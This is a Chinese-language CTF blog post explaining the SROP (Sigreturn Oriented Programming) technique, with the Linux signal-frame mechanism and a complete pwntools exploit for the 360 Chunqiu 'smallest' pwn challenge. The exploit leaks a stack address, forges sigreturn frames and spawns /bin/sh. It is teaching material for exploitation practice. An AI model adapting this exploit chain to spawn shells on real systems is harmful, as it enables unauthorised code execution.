
title: SROP

date: 2018-02-21 19:58:12

categories: 
- CTF
- SROP


SROP全称为 Sigreturn Oriented Programming ，表明利用sigreturn这个函数实现ROP的技术。


### 参考资料

http://www.freebuf.com/articles/network/87447.html
http://bobao.360.cn/learning/detail/3694.html
http://bobao.360.cn/learning/detail/3675.html
http://mutepig.club/index.php/archives/55/
http://www.angelwhu.com/blog/?p=504


### Signal机制

[![img](SROP/srop_1.png)](https://amliaw4.github.io/image/srop_1.png)

1.
首先，当由中断或异常产生时，会发出一个信号，然后会送给相关进程，此时系统切换到内核模式。

内核会执行do_signal()函数，最终会调用setup_frame()函数来设置用户栈。
（在栈中保存了进入内核前所有寄存器的信息，还会push一个 signal function 的返回地址——sigruturn()的地址）

2.
当这些准备工作完成后，就开始执行由用户指定的signal function了。
（调用的函数）

3.
当执行完后，因为返回地址被设置为sigreturn()系统调用的地址了，所以此时系统又会陷入内核执行sigreturn()系统调用。
（恢复保存的寄存器的信息）

### 利用思路

由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。

重要思路如下

通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn
通过syscall执行execve(“/bin/sh”,0,0)来获取shell。

### 示例

这里以360春秋杯中的smallest-pwn为例

```
#coding=utf8
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
# if args['REMOTE']:
#     sh = remote('127.0.0.1', 7777)
# else:
sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times

payload = p64(start_addr) * 3
# gdb.attach(sh)
sh.send(payload)

## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
## get stack addr

# gdb.attach(sh)
sh.send('\xb3')

stack_addr = u64(sh.recv()[8:16])
print "stack_addr = " + hex(stack_addr)
log.success('leak stack addr :' + hex(stack_addr))


## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
print "constants.SYS_read = " + hex(sigframe.rax)
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

payload = p64(start_addr) + 'a' * 8 + str(sigframe)

# gdb.attach(sh)
sh.send(payload)

## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'A' * 7  # 覆盖上面的 'a'*8

# gdb.attach(sh)
sh.send(sigreturn)

## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'

# gdb.attach(sh)
sh.send(payload)

# gdb.attach(sh)
sh.send(sigreturn)

sh.interactive()
```